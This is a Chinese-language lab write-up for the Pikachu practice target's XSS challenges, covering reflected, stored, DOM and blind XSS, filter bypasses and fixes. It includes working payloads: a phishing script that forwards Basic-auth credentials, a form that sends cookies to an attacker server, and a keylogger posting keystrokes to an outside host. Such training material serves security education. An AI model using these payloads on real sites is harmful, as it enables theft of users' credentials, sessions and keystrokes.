---
title: WEB漏洞靶场Pikachu Writeup Chapter 2：XSS
date: 2019-03-21 09:10:05
tags:
	- 靶场
	- WEB安全
	- XSS
categories: Pikachu
---

### 一、前面的话

#### 0x00 XSS可以分为如下几种常见类型

> - 反射性XSS
> - 存储型XSS
> - DOM型XSS

#### 0x01 XSS漏洞的防范

> 一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。

- 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;
- 输出转义：根据输出点的位置对输出到前端的内容进行适当转义;

<!-- more -->

#### 0x02 XSS过滤的简单绕过

> - 前端过滤绕过，抓包拦截改包即可。
> - 大小写绕过：`<SciPt>alert(1)</sCIpt>`（JavaScript大小写敏感，但HTML大小写不敏感）
> - 双写绕过：`<scr<script>ipt>alert(1)</scr</script>ipt>`
> - 注释干扰：`<scri<!-- comment-->pt>alert(1)</sc<!-- comment -->ript>`
> - 编码绕过：注意前端编码解码机制。

不同类型的XSS利用方式都差不多，目标是让其执行JS代码，因此在下面的例子中每个点只用一种漏洞利用方式。

### 二、XSS

#### 0x00 反射型XSS（GET）

**漏洞挖掘**

打开页面，是一个输入框。

![](WEB漏洞靶场pikachu-xss\QQ截图20190321091305.png)

随意输入内容，点击submit。可以发现我们输入的内容会被以GET的形式提交到服务器，并且会被放到响应页面中返回。

![](WEB漏洞靶场pikachu-xss\QQ截图20190321091552.png)

直接尝试最简单的测试Payload：`<script>alert(/xss/)</script>`（输入框有长度限制，直接在URL里输入）。我们输入的数据被当作JS代码执行，成功弹窗。

![](WEB漏洞靶场pikachu-xss\QQ截图20190321092149.png)

**漏洞利用(钓鱼攻击)**

简单的重定向钓鱼：

只需要将Payload改为：`<script>document.location.href="http://www.evil.com"</script>`。

`http://www.evil.com`为要重定向到的地址，即钓鱼页面。

![](WEB漏洞靶场pikachu-xss\QQ截图20190321093958.png)

接着诱导用户点击我们插入了Payload的链接，页面就会重定向到指定的钓鱼页面。

Basic验证钓鱼：

让用户访问我们插入了Payload的链接后，链接中的JS会被执行，执行结果就是请求fish.php，该文件会返回一个basic验证框。输入用户名密码后，会被发到我们的服务器。

Payload：`<script src=http://localhost/fish.php></script>`

fish.php内容：

```php
<?php
error_reporting(0);
// var_dump($_SERVER);
if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
//发送认证框，并给出迷惑性的info
    header('Content-type:text/html;charset=utf-8');
    header("WWW-Authenticate: Basic realm='认证'");
    header('HTTP/1.0 401 Unauthorized');
    echo 'Authorization Required.';
    exit;
} else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){
//将结果发送给搜集信息的后台,请将这里的IP地址修改为我们服务器的IP
    header("Location: http://192.168.100.126/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}
    &password={$_SERVER[PHP_AUTH_PW]}");
}

?>
```

诱导用户点击链接：`192.168.100.126/pikachu/vul/xss/xss_reflected_get.php?message=<script src=http://localhost/fish.php></script>&submit=submit`，弹出验证框：

![](WEB漏洞靶场pikachu-xss\QQ截图20190321140505.png)

输入用户名密码点击确定后，我们服务器的访问日志中发现用户名密码：

![](WEB漏洞靶场pikachu-xss\QQ截图20190321140720.png)

**漏洞分析**

用户在URL中提交的message参数的值会被服务器获取，然后未经任何过滤就拼接到字符串`$html`中。

接着会在返回给用户的页面中直接输出打印`$html`变量。

![](WEB漏洞靶场pikachu-xss\QQ截图20190321095133.png)

![](WEB漏洞靶场pikachu-xss\QQ截图20190321095226.png)

#### 0x01 反射型XSS（POST）

**漏洞挖掘**

打开页面，是一个登录页面，经过测试登录框不存在XSS，那么先进行登录，登录进去后会有一个输入框。

![](WEB漏洞靶场pikachu-xss\QQ截图20190321113514.png)

在输入框中输入`<script>alert(/xss/)</script>`进行测试。成功弹窗。

**漏洞利用（窃取Cookie）**

该漏洞类型属于POST型反射XSS，因为数据是通过POST方式提交的。

POST方式提交数据导致我们不能像GET方式那样，在URL中插入Payload诱导用户点击即可完成攻击。

POST型反射XSS漏洞利用（窃取Cookie）思路：

实际上是CSRF配合XSS。

在自己的服务器编写一个HTML文件，当访问该文件时，里面的JS会执行，执行效果是会自动提交POST数据。

诱导用户点击我们编写的HTML文件的URL。

![](WEB漏洞靶场pikachu-xss\QQ截图20190321115915.png)

```html
<html>
<head>
	<script>
		window.onload = function() {
  			document.getElementById("postsubmit").click();
			}
	</script>
</head>
<body>
	<form method="post" action="http://192.168.100.26/pikachu/vul/xss/xsspost/xss_reflected_post.php">
    <input id="xssr_in" type="text" name="message" value=
    "<script>
		document.location = 'http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
	</script>" />
    <input id="postsubmit" type="submit" name="submit" value="submit" />
	</form>
</body>
</html>
```

查看服务器访问日志，发现Cookie被发回：

![](WEB漏洞靶场pikachu-xss\QQ截图20190321131526.png)

**漏洞分析**

与GET方式的差别在于提交数据的方式不一样而已，其他都是一样的。

#### 0x02 存储型XSS

**漏洞挖掘**

打开页面，是一个留言的功能页面，随意输入然后提交，留言内容会被存储到数据库，然后输出到页面上。

![](WEB漏洞靶场pikachu-xss\QQ截图20190321132302.png)

输入`<script>alert(/xss/)</scipt>`并提交，JS被成功执行并弹窗。

**漏洞利用（键盘记录）**

JS Payload文件：

该JS文件作用是监听键盘记录，并将键盘记录通过AJAX请求发送到我们的服务器。

```javascript
function createAjax(){
    var request=false;
    if(window.XMLHttpRequest){
        request=new XMLHttpRequest();
        if(request.overrideMimeType){
            request.overrideMimeType("text/xml");
        }

    }else if(window.ActiveXObject){

        var versions=['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
        for(var i=0; i<versions.length; i++){
            try{
                request=new ActiveXObject(versions[i]);
                if(request){
                    return request;
                }
            }catch(e){
                request=false;
            }
        }
    }
    return request;
}

var ajax=null;
var xl="datax=";

function onkeypress() {
    var realkey = String.fromCharCode(event.keyCode);
    xl+=realkey;
    show();
}

document.onkeypress = onkeypress;

function show() {
    ajax = createAjax();
    ajax.onreadystatechange = function () {
        if (ajax.readyState == 4) {
            if (ajax.status == 200) {
                var data = ajax.responseText;
            } else {
                alert("页面请求失败");
            }
        }
    }

    var postdate = xl;
    ajax.open("POST", "http://192.168.1.15/rserver.php",true);
    ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    ajax.setRequestHeader("Content-length", postdate.length);
    ajax.setRequestHeader("Connection", "close");
    ajax.send(postdate);
}
```

`rserver.php`是我们服务器上用于接收键盘记录的页面。这里不能再使用任意URL然后看访问日志的方式。因为AJAX请求默认是受同源策略影响的，不能跨域进行请求。解决跨域请求的一个方法是，要请求的目标服务器在响应消息的头部中使用`Access-Control-Allow-Origin:xxx.com`来允许某些域可以发起跨域请求。

由于我们的目的就是要让它跨域发起请求发到我们的服务器上，所以我们用于接收键盘记录的页面编写为：

```php
<?php

//设置允许被任意域跨域访问
header("Access-Control-Allow-Origin:*");

$data = $_POST['datax'];

//保存到数据库
.......

?>
```

在留言处输入Payload`<script src=http://192.168.100.126/evil.js></script>`。之后在网页上按下的键都会被记录并发送到我们的接收页面。

![](WEB漏洞靶场pikachu-xss\QQ截图20190321153844.png)

**漏洞分析**

用户的留言提交到服务器后，服务器只进行了防SQLi的转义就直接保存到数据库中。访问留言页面时，会从数据库中把留言记录查询出来直接输出打印在页面中。

![](WEB漏洞靶场pikachu-xss\QQ截图20190321154523.png)

![](WEB漏洞靶场pikachu-xss\QQ截图20190321154819.png)

#### 0x03 DOM XSS(输入框)

**漏洞挖掘**

打开页面，有一个输入框，点击`Click me`，会出现一个`<a>`标签，猜测应该是JS操作DOM添加了一个标签。

![](WEB漏洞靶场pikachu-xss\QQ截图20190321160027.png)

查看页面源代码，找到对应的JS，可以发现我们在输入框输入的数据会被直接拼接在`<a>`标签，然后将新创建的`<a>`标签直接插入HTML中：

![](WEB漏洞靶场pikachu-xss\QQ截图20190321160530.png)

我们只要考虑闭合就可以随意插入JS代码。

在输入框输入：`#' onmouseover="alert(/xss/)">`，鼠标移动到`<a>`标签上，成功弹窗。

该漏洞比较鸡肋。

#### 0x04 DOM XSS（URL）

**漏洞挖掘**

打开页面后，操作与上一节一样，直接查看源代码，找到对应的JS。

由JS代码可知我们可以在URL中的text参数构造payload，然后点击页面的`<a>`标签，我们的payload就会被插入到HTML中。

![](WEB漏洞靶场pikachu-xss\QQ截图20190321162028.png)

构造text参数的值为：` ' onclick="alert(/xss/)">`

先点击`有些事费尽心思.......`

再点击`就让往事都随风......`

**漏洞利用**

该漏洞相对于上一节的DOM XSS漏洞要有危害得多，因为诱导用户点击链接就能完成攻击。

漏洞利用参照前面几节，都是差不多的。

#### 0x05 XSS盲打

XSS盲打是指输入的数据不确定会被输出到哪个页面，只能尝试性使用Payload。

XSS Blind 本质上也是存储型的XSS。

**漏洞挖掘**

打开页面，有输入框需要输入数据。输入的数据会被提交到服务器中，但是我们并不能确定我们输入的数据会被输出在哪个页面。

![](WEB漏洞靶场pikachu-xss\QQ截图20190322090316.png)

输入简单的payload测试：`<script>alert(/xss/)</script>`

![](WEB漏洞靶场pikachu-xss\QQ截图20190322090957.png)

在本例中，我们输入的数据会被保存到数据库，然后输出在管理员后台页面中，当我们插入xss的payload，管理员登录后台管理时就会被攻击，危害相当大。

![](WEB漏洞靶场pikachu-xss\QQ截图20190322091345.png)

**漏洞分析**

我们输入的数据未经过任何过滤处理就会被直接保存在服务器中。

![](WEB漏洞靶场pikachu-xss\QQ截图20190322091944.png)

后台页面会从数据库中读取数据，输出到页面。

![](WEB漏洞靶场pikachu-xss\QQ截图20190322092322.png)

#### 0x06 简单XSS过滤绕过

**漏洞挖掘**

打开页面，有一个输入框，输入一个XSS探针Payload来检测是否做了过滤，对什么做了过滤，XSS探针：

> `"'<script javascript onload src><a href></a>#$%^`

输入探针后点击提交，然后查看页面源代码，确定过滤，发现`<`、`script`、`javascript`直接被过滤了。但是其他并没有被过滤。

![](WEB漏洞靶场pikachu-xss\QQ截图20190322094644.png)

使用`<a>`标签、`<img>`标签就可以绕过过滤。使用Payload：`<img src=x onerror=alert(1)>`，成功弹窗。

**漏洞分析**

采用了正则进行过滤，我们除了可以使用`<a>`、`<img>`登其他标签之外，还可以使用大写的`script`标签绕过。

![](WEB漏洞靶场pikachu-xss\QQ截图20190322095504.png)

#### 0x07 XSS htmlspecialchars()过滤绕过

**漏洞挖掘**

打开页面时一个登录框，继续同上一节的操作，插入XSS探针然后查看页面源代码，可以看到一些特殊字符被实体编码了：

![](WEB漏洞靶场pikachu-xss\QQ截图20190322100707.png)

但可以注意到单引号并没有被转义，因此可以使用Payload：`' onmouseover=alert(1) '`

**漏洞分析**

分析源代码可知，后端使用`htmlspecialchars()`函数对用户的提交的数据进行了转义：

![](WEB漏洞靶场pikachu-xss\QQ截图20190322101307.png)

但是存在一个问题，`htmlspecialchars()`函数默认是不对单引号进行转义的，要想连单引号一起转义，需要给函数传入参数`ENT_QUOTES`。

`htmlspecialchars()`函数把预定义的字符转换为 HTML实体。

> 预定义的字符是：
>
>  ```
>   &  转为 `&amp;` 
>   "  转为 `&quot;`
>   '  转为 `&#039;` 
>   <  转为 `&lt;` 
>   >  转为 `&gt;`
>  ```
>
> 
>
> 可用的引号类型： 
>
> ```
> ENT_COMPAT - 默认。仅编码双引号。 
> ENT_QUOTES - 编码双引号和单引号。 
> ENT_NOQUOTES - 不编码任何引号。
> ```

**漏洞修复**

使用`htmlspecialchars($GET['message'],ENT_QUOTES)`,而不是`htmlspecialchars($GET['message'])`。

#### 0x08 XSS href输出

**漏洞挖掘**

打开页面继续使用XSS探针进行测试，可以发现特殊字符都被转义了，包括单引号。猜测使用了`htmlspecialchars($GET['message'],ENT_QUOTES)`对提交的数据进行转义。

![](WEB漏洞靶场pikachu-xss\QQ截图20190322102841.png)

但是，可以发现，我们输入的内容会被输出到`<a>`标签的`href`属性中。因此我们可以使用伪协议`javascript`进行绕过。

输入Payload：`javascript:alert(1)`,点击超链接，成功弹窗。

**漏洞分析**

后台确实对提交的数据进行了转义，但却没考虑到`href`属性可以使用伪协议执行JS。

![](WEB漏洞靶场pikachu-xss\QQ截图20190322103254.png)

**漏洞修复**

对输入的数据进行过滤，只允许http/https。

对输出的数据进行转义，使用`htmlspecialchars($GET['message'],ENT_QUOTES)`。

#### 0x09 XSS之输出到JS

**漏洞挖掘**

在页面输入内容，我们可以发现输入的数据会被输出在页面的JS代码之中，例如我们输入`whatever`：

![](WEB漏洞靶场pikachu-xss\QQ截图20190322104225.png)

那么，我们只需要考虑闭合，即可构造XSS，输入Payload：`'</script><script>alert(1)</script>`，成功弹窗。

**漏洞分析**

![](WEB漏洞靶场pikachu-xss\QQ截图20190322104702.png)

![](WEB漏洞靶场pikachu-xss\QQ截图20190322104739.png)

**漏洞修复**

这里有一个问题，由于输出点是`<script>`标签中，而在该标签中的内容HTML解析器是不会进行解码的，因此不能使用`htmlspecialchars()`函数进行转义，否则JS代码将会因为无法被解码而无法正常执行。具体原理参考文章：[XSS学习系列Chapter 1：浏览器解析HTML文档](https://sakuxa.com/2019/03/07/0x00-XSS%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E8%A7%A3%E6%9E%90HTML%E6%96%87%E6%A1%A3/)

所以解决方案应该是：在JS的输出点应该使用\对特殊字符进行转义。

### 三、总结

- XSS漏洞会出现的点是复杂的、多种多样的。
- XSS漏洞的本质是用户提交的数据被当作JS代码执行，因此挖掘XSS漏洞就是要想方设法让输入的数据被执行。
- XSS漏洞的防范总体可以概括为“对输入进行过滤”和“对输出进行转义”，但是针对不同地方、不同功能点的防范方式及要考虑的方面也是不尽相同的。如0x08与0x09小节就是很好的例子。